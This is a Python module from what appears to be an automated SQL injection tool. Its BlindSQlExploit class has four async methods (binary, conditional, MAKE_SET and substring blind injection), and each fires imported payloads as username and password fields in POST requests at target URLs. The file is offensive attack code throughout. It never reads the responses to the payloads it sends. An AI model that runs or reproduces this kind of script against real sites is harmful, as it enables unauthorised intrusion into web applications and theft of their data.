import os
import sys
current_directory = os.getcwd()

sys.path.append(current_directory)
from lib.mysqlblind.blindsqlpayloads import BlindSqlPayloads
import requests
from random import choice
from INFO.common import columns
from INFO.common import tables
from logger.sqljlog import logger as sqljlog
from logger.logs import logger
from lib.regelexpression.extractparameter import extract_parameter_name

class BlindSQlExploit:
    @staticmethod
    async def binary_sql_exploit(urls):
        parameter,_ = extract_parameter_name(urls)
        payload =BlindSqlPayloads.binsqlpayload(column=choice(columns) if parameter is None else parameter,table=choice(tables))
        rows = payload.split("\n")
        sorted_rows = sorted(rows)
        sorted_payload = "\n".join(sorted_rows)

        for Payloads in sorted_payload.split("\n"):
            if Payloads == "":
                continue
            check = requests.get(urls)
            if check.status_code == 200:
                logger.info(f"Host:{urls}")
                params = {
                    "username":Payloads,
                    "password":Payloads
                }
                attack = requests.post(url=urls,data=params)
                sqljlog.info(f"Testing:{Payloads}")
            
            else:
                logger.critical("Host is down.")
    
    @staticmethod
    async def conditional_blind_sql_inj_exploit(urls):
        parameter,_ = extract_parameter_name(urls)
        payload =BlindSqlPayloads.conditional_blind_sql_injection()
        rows = payload.split("\n")
        sorted_rows = sorted(rows)
        sorted_payload = "\n".join(sorted_rows)

        for Payloads in sorted_payload.split("\n"):
            if Payloads == "":
                continue
            check = requests.get(urls)
            if check.status_code == 200:
                logger.info(f"Host:{urls}")
                params = {
                    "username":Payloads,
                    "password":Payloads
                }
                attack = requests.post(url=urls,data=params)
                sqljlog.info(f"Testing:{Payloads}")
            
            else:
                logger.critical("Host is down.")

    @staticmethod
    async def make_sql_inj_exploit(urls):
        parameter,_ = extract_parameter_name(urls)
        payload =BlindSqlPayloads.make_set_sql_injection()
        rows = payload.split("\n")
        sorted_rows = sorted(rows)
        sorted_payload = "\n".join(sorted_rows)

        for Payloads in sorted_payload.split("\n"):
            if Payloads == "":
                continue
            check = requests.get(urls)
            if check.status_code == 200:
                logger.info(f"Host:{urls}")
                params = {
                    "username":Payloads,
                    "password":Payloads
                }
                attack = requests.post(url=urls,data=params)
                sqljlog.info(f"Testing:{Payloads}")
            
            else:
                logger.critical("Host is down.")

    @staticmethod 
    async def sub_string_sql_inj_exploit(urls):
        parameter,_ = extract_parameter_name(urls)
        payload =BlindSqlPayloads.sub_string_sql_inj(column=choice(columns) if parameter is None else parameter)
        rows = payload.split("\n")
        sorted_rows = sorted(rows)
        sorted_payload = "\n".join(sorted_rows)

        for Payloads in sorted_payload.split("\n"):
            if Payloads == "":
                continue
            check = requests.get(urls)
            if check.status_code == 200:
                logger.info(f"Host:{urls}")
                params = {
                    "username":Payloads,
                    "password":Payloads
                }
                attack = requests.post(url=urls,data=params)
                sqljlog.info(f"Testing:{Payloads}")
            
            else:
                logger.critical("Host is down.")


    